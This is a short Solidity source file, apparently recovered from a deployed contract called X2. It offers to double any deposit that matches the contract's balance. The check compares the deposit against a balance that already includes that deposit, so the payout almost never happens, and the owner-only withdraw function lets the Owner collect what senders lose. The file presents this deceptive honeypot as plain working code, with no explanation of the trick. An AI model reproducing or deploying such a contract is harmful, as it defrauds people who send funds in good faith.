/* 
 source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract X2 at 0xE0527863dF8abcb3caCA7dA329eb9C747822Aa98
*/
contract X2
{
        address public Owner = msg.sender;

        function() public payable{}

        function withdraw()  payable public
        {
                require(msg.sender == Owner);
                Owner.transfer(this.balance);
        }

        function multiplicate(address adr) public payable
        {
            if(msg.value>=this.balance)
            {
                adr.transfer(this.balance+msg.value);
            }
        }


}